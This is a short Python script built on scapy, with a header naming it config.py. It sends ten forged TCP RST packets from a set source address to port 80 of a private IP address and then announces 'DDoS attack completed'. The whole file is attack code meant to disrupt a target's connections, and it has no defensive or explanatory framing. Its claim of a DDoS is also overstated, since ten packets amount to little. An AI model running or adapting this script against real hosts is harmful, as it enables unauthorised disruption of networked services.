# -*- coding =  utf-8 -*-
"""
@Time : 2024/3/4 9:26
@Author: huangkai2
@File:config.py
@Software: PyCharm
"""
from scapy.all import *
from scapy.layers.inet import TCP, IP, ICMP, Ether

target_ip = "192.168.12.29"
num_packets = 10

for i in range(num_packets):
    ip_packet = IP(src="192.168.12.234", dst=target_ip)
    tcp_packet = TCP(sport=1234, dport=80, flags="R", seq=i, ack=i+1)
    packet = ip_packet / tcp_packet
    send(packet, verbose=0)
    print(f"Sent packet {i+1}/{num_packets}")

print("DDoS attack completed")
